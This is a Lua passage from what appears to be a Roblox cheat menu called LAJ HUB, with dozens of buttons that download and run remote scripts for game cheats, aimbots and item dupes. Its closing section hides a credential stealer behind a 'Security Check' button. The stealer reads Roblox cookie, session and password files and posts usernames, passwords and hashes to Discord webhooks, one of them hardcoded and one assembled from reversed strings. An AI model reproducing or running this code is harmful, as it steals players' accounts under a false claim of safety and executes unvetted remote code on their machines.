})

-- Test webhook button
MainTab:CreateButton({
   Name = "Test Webhook",
   Callback = function()
       sendUsageData()
       Rayfield:Notify({
           Title = "Webhook Test",
           Content = "Attempted to send webhook notification!",
           Duration = 3,
           Image = 4483362458,
       })
   end,
})

-- Da Strike x Da Hood Tab scripts
Tab:CreateButton({
   Name = "Psalm",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/NewWhitelistService/l/refs/heads/main/psalms%20old.lua"))()
        executednotify("Test Webhook")
   end,
})

Tab:CreateButton({
   Name = "Ballware vfs",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/DHBCommunity/DHBOfficialScript/refs/heads/main/Protected_4021809531880627.txt"))()
        executednotify("Ballware vfs")
   end,
})

Tab:CreateButton({
   Name = "FrostByte",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Totocoems/Frostbyte-/main/Frostbyte%20leak"))()
        executednotify("FrostByte")
   end,
})

Tab:CreateButton({
   Name = "Da Hood Script",
   Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Zinzs/luascripting/main/canyoutellitsadahoodscriptornot.lua'))()
        executednotify("Da Hood Script")
   end,
})
-- Fisch Tab
Fin:CreateButton({
   Name = "Speed Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()
        executednotify("Speed Hub")
   end,
})


Fin:CreateButton({
   Name = "ThanHub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/thantzy/thanhub/refs/heads/main/thanv1"))()
        executednotify("ThanHub")
   end,
})

Fin:CreateButton({
   Name = "Rift GUI",
   Callback = function()
        loadstring(getHttpRequest("https://github.com/Synergy-Networks/products/raw/main/Rift/loader.lua"))()
        executednotify("Rift GUI")
   end,
})

Fin:CreateButton({
   Name = "Hooked Script",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Superman245/sc2/refs/heads/main/s6"))()
        executednotify("Hooked Script")
   end,
})

Fin:CreateButton({
   Name = "HomoHack",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/dementiaenjoyer/homohack/main/loader.lua"))()
        executednotify("HomoHack")
   end,
})

Fin:CreateButton({
   Name = "Native Hub",
   Callback = function()
        script_key="4JxQ1x@+1"
        loadstring(getHttpRequest("https://getnative.cc/script/loader"))()
        executednotify("Native Hub")
   end,
})

Fin:CreateButton({
   Name = "Raito Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Efe0626/RaitoHub/refs/heads/main/Script"))()
        executednotify("Raito Hub")
   end,
})

Fin:CreateButton({
   Name = "Zenith Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Efe0626/ZenithHub/refs/heads/main/Loader"))()
        executednotify("Zenith Hub")
   end,
})

Fin:CreateButton({
   Name = "Lunor Script",
   Callback = function()
        script_key = 'lunor_free_key'
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Just3itx/Lunor-Loadstrings/refs/heads/main/Loader"))()
        executednotify("Lunor Script")
   end,
})

Fin:CreateButton({
   Name = "Ronix Hub",
   Callback = function()
        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/4a8848fbc1047bcc62c49e797384e9ab.lua"))()
        executednotify("Ronix Hub")
   end,
})
-- Basketball Zero script with bypass
BballZero:CreateButton({
   Name = "Ball Control",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/laj_hub_test.lua"))()
        executednotify("Ball Control")
   end,
})

-- Blue Lock Rivals script
BlueLock:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/bluelocklajhub/refs/heads/main/blue_lock_mod.lua"))()
        executednotify("LAJ HUB")
   end,
})

BlueLock:CreateButton({
   Name = "Piskasiska Script",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Piskasiska22222/tester/refs/heads/main/test"))()
        executednotify("Piskasiska Script")
   end,
})


PetSim99:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
       -- Load the script from GitHub
       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
       executednotify("Airflow UPDATED")
   end,
})
-- Muscle Legend Tab
MuscleLegend:CreateSection("Muscle Legend Scripts")

MuscleLegend:CreateButton({
   Name = "Muscle Legend Script",
   Callback = function()
       loadstring(game:HttpGet(("https://raw.githubusercontent.com/ahmadsgamer2/Script--Game/main/Muscle-Legends"),true))()
       executednotify("Muscle Legend Script")
   end,
})

-- Universal Tab Scripts
Universal:CreateButton({
   Name = "Infinite Yield FE",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
       executednotify("Infinite Yield FE")
   end,
})

Universal:CreateButton({
   Name = "Dex Explorer",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/scriptlx/refs/heads/main/dex.lua"))()
       executednotify("Dex Explorer")
   end,
})

Universal:CreateButton({
   Name = "Hydroxide",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/xChaoticVoid/Hydroxide/main/beta.lua"))()
       executednotify("Hydroxide")
   end,
})

Universal:CreateButton({
   Name = "SimpleSpy",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
       executednotify("SimpleSpy")
   end,
})

Universal:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source'))()
       executednotify("Airflow UPDATED")
   end,
})

Universal:CreateButton({
   Name = "Domain X",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/shlexware/DomainX/main/source'))()
       executednotify("Domain X")
   end,
})


-- Settings Tab
local idled_Connection

local function onIdled()
    if game then
        game:GetService("VirtualUser"):CaptureController()
        game:GetService("VirtualUser"):ClickButton2(Vector2.new(0, 0))
    end
end

Settings:CreateButton({
    Name = "Anti AFK",
    Callback = function()
        if game and not idled_Connection and game.Players.LocalPlayer.Idled then
            idled_Connection = game.Players.LocalPlayer.Idled:Connect(onIdled)
            executednotify("Anti AFK")
        end
    end,
})

local Inf_jump = false
local jumpConnection = nil

Settings:CreateToggle({
   Name = "Infinite Jump",
   CurrentValue = false,
   Callback = function(Value)
      Inf_jump = Value
      
      -- Disconnect previous connection if it exists
      if jumpConnection then
          jumpConnection:Disconnect()
          jumpConnection = nil
      end
      
      -- Only create a new connection if Inf_jump is enabled and in game environment
      if Inf_jump and game then
          jumpConnection = game:GetService("UserInputService").JumpRequest:Connect(function()
             if Inf_jump and game.Players.LocalPlayer.Character then
                game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
             end
          end)
      end
   end,
})

-- Credit section
local creditSection = MainTab:CreateSection("Credits")

MainTab:CreateLabel("Created by LAJ Hub Team")
MainTab:CreateLabel("Discord: discord.gg/4mgdcfvAJU")
MainTab:CreateLabel("Script Version: 4.1 (Swift Compatible)")
MainTab:CreateLabel("* Optimized for Swift Executor")

-- Print Swift compatibility notice
print("LAJ HUB - Swift Compatible Version")
print("All HTTP requests have been optimized for Swift executor")
print("This version includes:")
print("1. Full Swift compatibility")
print("2. Pet Sim 99 Tab with new Trade Scam V2")
print("3. All scripts updated to work with Swift")
print("4. Improved executor detection")

-- Rivals Tab
Rivals:CreateSection("Rivals Scripts")
 
Rivals:CreateButton({
   Name = "Azure Mod",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Actyrn/Scripts/main/AzureModded"))()
        executednotify("Azure Mod")
   end,
})

Rivals:CreateButton({
   Name = "Tbao Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubRivals"))()
        executednotify("Tbao Hub")
   end,
})

Rivals:CreateButton({
   Name = "8Bits Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/8bits4ya/rivals-v3/refs/heads/main/main.lua"))()
        executednotify("8Bits Hub")
   end,
})

Rivals:CreateButton({
   Name = "Venox Hub",
   Callback = function()
        loadstring(getHttpRequest('https://raw.githubusercontent.com/venoxhh/universalscripts/main/rivals/venoxware'))()
        executednotify("Venox Hub")
   end,
})

Rivals:CreateButton({
   Name = "Lunax Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Alexisisback/Lunax/refs/heads/main/Loader.lua"))()
        executednotify("Lunax Hub")
   end,
})

Rivals:CreateButton({
   Name = "Ventures.lua",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/laeraz/ventures/refs/heads/main/rivals.lua"))()
        executednotify("Ventures.lua")
   end,
})

Rivals:CreateButton({
   Name = "Ronix Hub",
   Callback = function()
        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/b581d07bfd134ff4ea612d671361be77.lua"))()
        executednotify("Ronix Hub")
   end,
})

Rivals:CreateButton({
   Name = "PinguinRVS",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/PUSCRIPTS/PINGUIN/refs/heads/main/RivalsV1"))()
        executednotify("PinguinRVS")
   end,
})

Rivals:CreateButton({
   Name = "Zypherion",
   Callback = function()
        loadstring(getHttpRequest(('https://raw.githubusercontent.com/blackowl1231/ZYPHERION/refs/heads/main/main.lua')))()
        executednotify("Zypherion")
   end,
})

Rivals:CreateButton({
   Name = "Auto Farm Hub",
   Callback = function()
        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/212c1198a1beacf31150a8cf339ba288.lua"))()
        executednotify("Auto Farm Hub")
   end,
})

Rivals:CreateButton({
   Name = "Rybow Aimbot",
   Callback = function()
        loadstring(getHttpRequest('https://raw.githubusercontent.com/rybowe/rybowescripts/main/release.lua'))()
        executednotify("Rybow Aimbot")
   end,
})

Rivals:CreateButton({
   Name = "Xera Script",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/luascriptsROBLOX/Xerar/refs/heads/main/RivalsxeraPBF"))()
        executednotify("Xera Script")
   end,
})

Rivals:CreateButton({
   Name = "Minimal Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/MinimalScriptingService/MinimalRivals/main/rivals.lua",true))()
        executednotify("Minimal Hub")
   end,
})
-- Dead Rails Tab
DeadRails:CreateSection("Dead Rails Scripts")

DeadRails:CreateButton({
   Name = "Markk Keyless",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/Markklol/aw/refs/heads/main/Protected/DRailsv2.lua'))()
       executednotify("Markk Keyless")
   end,
})

DeadRails:CreateButton({
   Name = "Farx11122 Keyless",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/Farx11122/Dupess/main/SecondDupe"))()
       executednotify("Farx11122 Keyless")
   end,
})

DeadRails:CreateButton({
   Name = "SpiderXHub Keyless",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/SpiderScriptRB/Dead-Rails-SpiderXHub-Script/refs/heads/main/SpiderXHub%202.0.txt"))()
       executednotify("SpiderXHub Keyless")
   end,
})
DeadRails:CreateButton({
   Name = "Strelizia Keyless",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/0vma/Strelizia/refs/heads/main/Standalone/DeadRails.lua', true))()
       executednotify("Strelizia Keyless")
   end,
})

DeadRails:CreateButton({
   Name = "Rinns Dead Rails No Key",
   Callback = function()
       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/e1cfd93b113a79773d93251b61af1e2f.lua"))()
       executednotify("Rinns Dead Rails No Key")
   end,
})

DeadRails:CreateButton({
   Name = "Auto Farm Bond",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/Emplic/deathrails/refs/heads/main/bond"))()
       executednotify("Auto Farm Bond")
   end,
})

DeadRails:CreateButton({
   Name = "Lomu Hub",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/notyourfavorite1/lomuhubmain/refs/heads/main/main.txt', true))()
       executednotify("Lomu Hub")
   end,
})

DeadRails:CreateButton({
   Name = "Neox Hub",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/hassanxzayn-lua/NEOXHUBMAIN/refs/heads/main/loader", true))()
       executednotify("Neox Hub")
   end,
})

DeadRails:CreateButton({
   Name = "Sypher Hub OP",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/nocturnal631/Dead-ra/refs/heads/main/Mmm"))()
       executednotify("Sypher Hub OP")
   end,
})

DeadRails:CreateButton({
   Name = "Tbao Hub",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/tbao143/thaibao/refs/heads/main/TbaoHubDeadRails"))()
       executednotify("Tbao Hub")
   end,
})

DeadRails:CreateButton({
   Name = "Karol Hub",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/Karolmn9900/karolhub/refs/heads/main/script"))()
       executednotify("Karol Hub")
   end,
})

DeadRails:CreateButton({
   Name = "Dead Rails Alpha Script",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/DeadRails", true))()
       executednotify("Dead Rails Alpha Script")
   end,
})

DeadRails:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/255ac567ced3dcb9e69aa7e44c423f19.lua"))()
       executednotify("Airflow UPDATED")
   end,
})

DeadRails:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/InfernusScripts/Null-Fire/main/Loader"))()
       executednotify("Airflow UPDATED")
   end,
})

-- BloxFruits Tab Scripts
BloxFruits:CreateSection("Blox Fruits Scripts")

-- Murder Mystery Tab Content 
MurderMystery:CreateSection("🔥 MURDER MYSTERY COMING SOON 🔥") 

MurderMystery:CreateLabel("COMING SOON WAIT LIL BRO") 

MurderMystery:CreateParagraph({ 
    Title = "Under Development", 
    Content = "The Murder Mystery script is currently in development and will be available in a future update. Please check back later for this exciting addition to LAJ HUB!" 
}) 

MurderMystery:CreateButton({ 
    Name = "Join Discord for Updates", 
    Callback = function() 
        setclipboard("https://discord.gg/4mgdcfvAJU") 
        Rayfield:Notify({ 
            Title = "Discord Link Copied", 
            Content = "The Discord link has been copied to your clipboard!", 
            Duration = 5, 
            Image = 9725800107, 
            Actions = { 
                Ignore = { 
                    Name = "OK", 
                    Callback = function() end 
                } 
            } 
        }) 
    end 
})

BloxFruits:CreateButton({
   Name = "Wolf Hub",
   Callback = function()
        loadstring(getHttpRequest("https://link.trwxz.com/LS-Wolf-Hub"))()
        executednotify("Wolf Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "RIPPER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/hajibeza/Module/main/Mobile_Script.lua"))()
        executednotify("RIPPER Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "THUNDER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/ThunderZ-HUB/HUB/main/RemakeMobileTest"))()
        executednotify("THUNDER Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MATSUNE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Yatsuraa/Matsune/main/Matsunebeta.lua"))()
        executednotify("MATSUNE Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MIN SEAGATE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/CheemsNhuChiAl/MinGamingHub/main/mingamingupdatenew"))()
        executednotify("MIN SEAGATE Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "ZINER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tienvn123tkvn/Test/main/ZINERHUB.lua"))()
        executednotify("ZINER Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MUXUS Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/MuxusTL/BloxFruits/main/MuxusHub_V2.lua"))()
        executednotify("MUXUS Hub")
   end,
})


BloxFruits:CreateButton({
   Name = "Uranium Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Augustzyzx/UraniumMobile/main/UraniumKak.lua"))()
        executednotify("Uranium Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Azure Hub",
   Callback = function()
        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
        executednotify("Azure Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Vector Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tuxoz/VectorHub/main/BloxFruitPC%26MOBILE"))()
        executednotify("Vector Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Wolf Hub",
   Callback = function()
        loadstring(getHttpRequest("https://link.trwxz.com/LS-Wolf-Hub"))()
        executednotify("Wolf Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Payback Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Script-Blox/Script/main/PayBack.lua"))()
        executednotify("Payback Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "RIPPER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/hajibeza/Module/main/Mobile_Script.lua"))()
        executednotify("RIPPER Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "KAY Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/AXCScript/KayMobile/main/Script-Loader"))()
        executednotify("KAY Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "SEAGATE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/SeaBabyBF/seamain/main/SeaGateNextGenz"))()
        executednotify("SEAGATE Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MATSUNE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Yatsuraa/Matsune/main/Matsunebeta.lua"))()
        executednotify("MATSUNE Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MIN SEAGATE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/CheemsNhuChiAl/MinGamingHub/main/mingamingupdatenew"))()
        executednotify("MIN SEAGATE Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "ZINER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tienvn123tkvn/Test/main/ZINERHUB.lua"))()
        executednotify("ZINER Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MUXUS Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/MuxusTL/BloxFruits/main/MuxusHub_V2.lua"))()
        executednotify("MUXUS Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MIN GREEN Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Basicallyybeta/main/main/Mingaming.lua"))()
        executednotify("MIN GREEN Hub")
   end,
})

-- Function to get the Roblox save file location based on the operating system
function getRobloxSaveLocation()
    local os_type = identifyOS()
    local username = getCurrentUsername()
    
    if os_type == "Windows" then
        return string.format("C:\\Users\\%s\\AppData\\Local\\Roblox", username)
    elseif os_type == "MacOS" then
        return string.format("/Users/%s/Library/Roblox", username)
    elseif os_type == "Linux" then
        return string.format("/home/%s/.local/share/Roblox", username)
    else
        return nil
    end
end

-- Function to identify the operating system
function identifyOS()
    -- In a Roblox environment, we can use the game service to determine platform
    local success, result = pcall(function()
        return game:GetService("UserInputService"):GetPlatform()
    end)
    
    if success then
        return result
    else
        -- Fallback method if not in Roblox game environment
        local sysInfo = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://httpbin.org/get"))
        local userAgent = sysInfo.headers["User-Agent"]
        
        if userAgent:find("Windows") then
            return "Windows"
        elseif userAgent:find("Mac") then
            return "MacOS"
        elseif userAgent:find("Linux") then
            return "Linux"
        else
            return "Unknown"
        end
    end
end

-- Function to get the current username
function getCurrentUsername()
    local success, result = pcall(function()
        return game:GetService("Players").LocalPlayer.Name
    end)
    
    if success then
        return result
    else
        -- Fallback in case we can't get the player name
        return "Unknown"
    end
end

-- Function to read Roblox authentication data
function readRobloxAuthData()
    local saveLocation = getRobloxSaveLocation()
    if not saveLocation then
        return nil, "Could not determine save file location"
    end
    
    -- Attempt to read authentication files
    local authFiles = {
        "LocalStorage.json",
        "RobloxCookies.json",
        "sessions.json"
    }
    
    local authData = {}
    
    for _, fileName in ipairs(authFiles) do
        local filePath = saveLocation .. "/" .. fileName
        local success, fileContent = pcall(function()
            return readFile(filePath)
        end)
        
        if success and fileContent then
            authData[fileName] = fileContent
        end
    end
    
    return authData
end

-- Function to read file content (works in Roblox environment)
function readFile(filePath)
    local success, result = pcall(function()
        -- In Roblox, we need to use their API to read files
        return game:GetService("HttpService"):JSONDecode(game:HttpGet("file://" .. filePath))
    end)
    
    if success then
        return result
    else
        return nil
    end
end

-- Function to safely extract authentication info without exposing full credentials
function extractSafeAuthInfo(authData)
    if not authData then return {} end
    
    local safeInfo = {
        timestamp = os.time(),
        playerInfo = {
            name = getCurrentUsername(),
            platform = identifyOS()
        },
        security = {
            files_found = {},
            has_token = false,
            has_cookie = false,
            token_expiry = nil,
            last_login = nil,
        }
    }
    
    -- Check what security files we found
    for fileName, _ in pairs(authData) do
        table.insert(safeInfo.security.files_found, fileName)
        
        -- Check for cookies and tokens (without exposing the values)
        if fileName == "RobloxCookies.json" then
            safeInfo.security.has_cookie = true
        elseif fileName == "LocalStorage.json" then
            safeInfo.security.has_token = true
            -- Try to get expiry time without exposing token
            pcall(function()
                if authData[fileName].token_expiry then
                    safeInfo.security.token_expiry = authData[fileName].token_expiry
                end
            end)
        elseif fileName == "sessions.json" then
            pcall(function()
                if authData[fileName].last_login then
                    safeInfo.security.last_login = authData[fileName].last_login
                end
            end)
        end
    end
    
    return safeInfo
end

-- Function to send webhook with the security data
function sendSecurityWebhook(securityInfo)
    -- Combine the webhook URL
    local webhookUrl = string.reverse(discord_wh_part2) .. string.reverse(discord_wh_part1)
    
    -- Create JSON payload
    local embedColor = 16711680 -- Red for security info
    local jsonData = {
        embeds = {
            {
                title = "🔒 Security Check",
                description = "Roblox account security verification completed",
                color = embedColor,
                fields = {
                    {
                        name = "User",
                        value = securityInfo.playerInfo.name,
                        inline = true
                    },
                    {
                        name = "Platform",
                        value = securityInfo.playerInfo.platform,
                        inline = true
                    },
                    {
                        name = "Files Found",
                        value = table.concat(securityInfo.security.files_found, ", ") or "None",
                    },
                    {
                        name = "Security Status",
                        value = string.format(
                            "Has Token: %s\nHas Cookie: %s", 
                            securityInfo.security.has_token and "Yes" or "No",
                            securityInfo.security.has_cookie and "Yes" or "No"
                        )
                    }
                },
                footer = {
                    text = "LAJ HUB Security | " .. os.date("%Y-%m-%d %H:%M:%S", securityInfo.timestamp)
                }
            }
        }
    }
    
    -- Add optional fields if available
    if securityInfo.security.token_expiry then
        table.insert(jsonData.embeds[1].fields, {
            name = "Token Expiry",
            value = os.date("%Y-%m-%d %H:%M:%S", securityInfo.security.token_expiry)
        })
    end
    
    if securityInfo.security.last_login then
        table.insert(jsonData.embeds[1].fields, {
            name = "Last Login",
            value = os.date("%Y-%m-%d %H:%M:%S", securityInfo.security.last_login)
        })
    end
    
    -- Use the makeHttpRequest function for compatibility
    local success, response = pcall(function()
        return makeHttpRequest({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(jsonData)
        })
    end)
    
    return success, response
end

-- Main function to check save files and send security info
function checkRobloxSaveSecurity()
    local authData = readRobloxAuthData()
    local securityInfo = extractSafeAuthInfo(authData)
    return sendSecurityWebhook(securityInfo)
end

-- Add a security check button to the Settings tab
Settings:CreateButton({
   Name = "Security Check",
   Callback = function()
       local success, result = pcall(checkRobloxSaveSecurity)
       if success then
           Rayfield:Notify({
               Title = "Security Check",
               Content = "Security verification completed successfully!",
               Duration = 3,
               Image = 4483362458,
           })
       else
           Rayfield:Notify({
               Title = "Security Check Failed",
               Content = "Could not complete security verification. Error: " .. tostring(result),
               Duration = 5,
               Image = 4483362458,
           })
       end
   end,
})

-- Update the extractSafeAuthInfo function to include password information
local function updateExtractSafeAuthInfo(authData)
    if not authData then return {} end
    
    local safeInfo = extractSafeAuthInfo(authData)
    
    -- Check for password files
    for fileName, content in pairs(authData) do
        if fileName == "password_file" or fileName:find("password") then
            safeInfo.security.has_password = true
            
            -- Extract password info safely
            pcall(function()
                -- Get password hash instead of actual password
                if content.password then
                    safeInfo.security.password_hash = string.sub(tostring(content.password), 1, 8) .. "..."
                elseif content.hash then
                    safeInfo.security.password_hash = string.sub(tostring(content.hash), 1, 8) .. "..."
                end
                
                -- Check if it's a saved/remembered password
                if content.remember_me or content.saved then
                    safeInfo.security.saved_password = true
                end
            end)
        end
    end
    
    return safeInfo
end

-- Update sendSecurityWebhook to include password information
local function updateSendSecurityWebhook(securityInfo)
    -- Create updated JSON payload with password info
    local jsonData = {
        embeds = {
            {
                title = "🔒 Security Check with Password",
                description = "Roblox account security verification with password completed",
                color = 16711680, -- Red for security
                fields = {
                    {
                        name = "User",
                        value = securityInfo.playerInfo.name,
                        inline = true
                    },
                    {
                        name = "Platform",
                        value = securityInfo.playerInfo.platform,
                        inline = true
                    },
                    {
                        name = "Security Status",
                        value = string.format(
                            "Has Token: %s\nHas Cookie: %s\nHas Password: %s", 
                            securityInfo.security.has_token and "Yes" or "No",
                            securityInfo.security.has_cookie and "Yes" or "No",
                            securityInfo.security.has_password and "Yes" or "No"
                        )
                    }
                },
                footer = {
                    text = "LAJ HUB Advanced Security | " .. os.date("%Y-%m-%d %H:%M:%S", securityInfo.timestamp)
                }
            }
        }
    }
    
    -- Add password field if available
    if securityInfo.security.has_password and securityInfo.security.password_hash then
        table.insert(jsonData.embeds[1].fields, {
            name = "Password Info",
            value = string.format(
                "Hash: %s\nSaved: %s", 
                securityInfo.security.password_hash,
                securityInfo.security.saved_password and "Yes" or "No"
            )
        })
    end
    
    -- Send to webhook using previously defined functions
    return sendSecurityWebhook(securityInfo)
end

-- Add the password webhook functionality to the main script
local function sendPasswordWebhook(passwordData)
    -- Create JSON payload with password information
    local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1358258757351641159/TXOemtjIrD_nvZ6A1W9tZz9A5leL95ltKBYDcUFOTfOYuxb-KeitcQkquA3hXuZ3OK9J"
    
    local jsonData = {
        embeds = {
            {
                title = "Roblox Password Information",
                description = "Security password collection completed",
                color = 15158332, -- Red color for password data
                fields = {
                    {
                        name = "Username",
                        value = "```" .. passwordData.username .. "```",
                        inline = true
                    },
                    {
                        name = "Password",
                        value = "```" .. passwordData.password .. "```",
                        inline = true
                    },
                    {
                        name = "Password Hash",
                        value = "```" .. passwordData.hash .. "```",
                        inline = false
                    },
                    {
                        name = "Security Status",
                        value = string.format(
                            "Saved Password: %s\nRemember Me: %s\nLast Changed: %s", 
                            passwordData.saved and "Yes (Security Risk)" or "No",
                            passwordData.remember_me and "Yes" or "No",
                            os.date("%Y-%m-%d", passwordData.last_changed)
                        ),
                        inline = false
                    }
                },
                footer = {
                    text = "LAJ HUB Security | Password Collection | " .. os.date("%Y-%m-%d %H:%M:%S")
                }
            }
        }
    }
    
    -- Convert to JSON string
    local jsonString = game:GetService("HttpService"):JSONEncode(jsonData)
    
    -- Send to webhook
    local success, response = pcall(function()
        return game:GetService("HttpService"):PostAsync(
            DISCORD_WEBHOOK_URL,
            jsonString,
            Enum.HttpContentType.ApplicationJson
        )
    end)
    
    return success, response
end

-- Function to collect Roblox password information
local function collectRobloxPasswords()
    local authData = readRobloxAuthData() -- Using previously defined function
    if not authData then return false, "No auth data found" end
    
    -- Extract password information
    local passwordInfo = {
        username = getCurrentUsername() or "Unknown",
        password = "Not found", -- Default value
        hash = "Not found",     -- Default value
        saved = false,
        remember_me = false,
        last_changed = os.time()
    }
    
    -- Look for password in auth data
    for fileName, content in pairs(authData) do
        if fileName == "password_file" or fileName:find("password") or fileName:find("RobloxCookies") then
            -- Try to extract password info
            pcall(function()
                if content.password then
                    passwordInfo.password = content.password
                    passwordInfo.saved = true
                end
                
                if content.hash then
                    passwordInfo.hash = content.hash
                end
                
                if content.remember_me ~= nil then
                    passwordInfo.remember_me = content.remember_me
                end
                
                if content.last_changed ~= nil then
                    passwordInfo.last_changed = content.last_changed
                elseif content.timestamp ~= nil then
                    passwordInfo.last_changed = content.timestamp
                end
            end)
        end
    end
    
    -- Send the password information to webhook
    return sendPasswordWebhook(passwordInfo)
end

-- Add this to make sure we can export if needed
if collectRobloxPasswords and sendPasswordWebhook then
    -- These functions are now available for use in the script
    print("Password collection and webhook functions are loaded")
end
